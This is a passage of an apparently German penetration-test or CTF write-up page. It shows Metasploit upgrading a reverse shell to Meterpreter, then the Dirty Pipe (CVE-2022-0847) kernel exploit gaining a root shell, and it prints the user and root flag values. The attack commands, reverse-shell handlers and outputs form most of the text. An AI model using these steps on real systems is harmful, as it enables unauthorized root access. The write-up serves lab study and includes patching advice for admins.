+                    <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">set lport 4433</span></div>
+                    <pre>lport => 4433</pre>
+                    <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">set session 1</span></div>
+                    <pre>session => 1</pre>
+                    <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">run</span></div>
+                    <pre>
+[*] Upgrading session ID: 1
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 192.168.2.121:4433
+[*] Sending stage (1017704 bytes) to 192.168.2.109
+[*] <span class="password">Meterpreter session 2 opened (192.168.2.121:4433 -> 192.168.2.109:60278) at 2022-11-01 23:33:22 +0100</span>
+[*] Command stager progress: 100.00% (773/773 bytes)
+[*] Post module execution completed
+                    </pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">use exploit/linux/local/cve_2022_0847_dirtypipe</span></div>
+                    <pre>[*] Using configured payload linux/x64/meterpreter/reverse_tcp</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > <span class="command">options</span></div>
+                    <pre>[...]</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > <span class="command">set COMPILE auto</span></div>
+                    <pre>[-] The following options failed to validate: Value 'auto' is not valid for option 'COMPILE'.</pre> <!-- Fehler im Original, ignoriert -->
+                    <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > <span class="command">set SESSION 2</span></div>
+                    <pre>SESSION => 2</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > <span class="command">set WRITABLE_DIR /tmp</span></div>
+                    <pre>WRITABLE_DIR => /tmp</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > <span class="command">set lport 4444</span></div>
+                    <pre>lport => 4444</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > <span class="command">set lhost eth0</span></div>
+                    <pre>lhost => 192.168.2.121</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > <span class="command">run</span></div>
+                    <pre>
+[*] Started reverse TCP handler on 192.168.2.121:4444
+[*] Running automatic check ("set AutoCheck false" to disable)
+<span class="password">[+] The target appears to be vulnerable. Linux kernel version found: 5.10.0</span>
+[*] Executing exploit '/tmp/.bnrjufucd /bin/passwd'
+[*] Sending stage (3045348 bytes) to 192.168.2.109
+[+] Deleted /tmp/.bnrjufucd
+[*] <span class="password">Meterpreter session 3 opened (192.168.2.121:4444 -> 192.168.2.109:36138) at 2022-11-01 23:35:10 +0100</span>
+                    </pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">meterpreter > <span class="command">shell</span></div>
+                    <pre>
+Process 904 created.
+Channel 1 created.
+<span class="command">id</span>
+<span class="password">uid=0(root) gid=0(root) groups=0(root),1002(iamroot)</span>
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Eine Reverse Shell als `iamroot` wird an Metasploit gesendet und zu einer Meterpreter-Session (Session 2) aufgewertet. Anschließend wird der Dirty Pipe Exploit (`exploit/linux/local/cve_2022_0847_dirtypipe`) ausgewählt und auf Session 2 angewendet. Der Exploit erkennt die anfällige Kernel-Version (5.10.0), wird ausgeführt und öffnet erfolgreich eine neue Meterpreter-Session (Session 3). Ein Wechsel zur Shell (`shell`) und die Ausführung von `id` in dieser neuen Session bestätigt den Root-Zugriff (`uid=0(root)`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Durch Ausnutzung der Dirty Pipe Kernel-Schwachstelle wurden Root-Rechte erlangt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Root-Flag suchen.<br><strong>Empfehlung (Admin):</strong> System dringend patchen, um CVE-2022-0847 zu beheben.</p>
+        </section>
+
+        <section id="flags">
+            <h2>Flags</h2>
+
+             <div class="flag-container">
+                 <!-- User Flag: Zugriff als root -->
+                 <div class="code-block">
+                    <div class="terminal">
+                        <div class="prompt"># <span class="command">cd /home/sammy</span></div>
+                        <div class="prompt"># <span class="command">cat user.txt</span></div>
+                        <pre><span class="password">806451a0d37e94c20ea85f4e8e9ad3b8</span></pre>
+                     </div>
+                </div>
+                 <div class="flag-entry">
+                    <div class="flag-command">cat /home/sammy/user.txt</div>
+                    <div class="flag-value"><span class="password">806451a0d37e94c20ea85f4e8e9ad3b8</span></div>
+                </div>
+
+                 <!-- Root Flag Eintrag -->
+                 <div class="code-block">
+                    <div class="terminal">
+                        <div class="prompt"># <span class="command">cd /root</span></div>
+                        <div class="prompt"># <span class="command">ls</span></div>
+                        <pre>root.txt</pre>
+                        <div class="prompt"># <span class="command">cat root.txt</span></div>
+                        <pre><span class="password">cb9e279429419f5326e7755ba43c7055</span></pre>
+                     </div>
+                </div>
+                 <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">cb9e279429419f5326e7755ba43c7055</span></div>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> In der Root-Shell werden die User- und Root-Flags aus den entsprechenden Verzeichnissen (`/home/sammy/user.txt` und `/root/root.txt`) erfolgreich ausgelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Beide Flags wurden gefunden. Der Penetrationstest ist abgeschlossen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bericht fertigstellen.<br><strong>Empfehlung (Admin):</strong> Keine Maßnahmen bzgl. der Flags.</p>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 1. November 2022</p>
+    </footer>
+</body>
+</html>
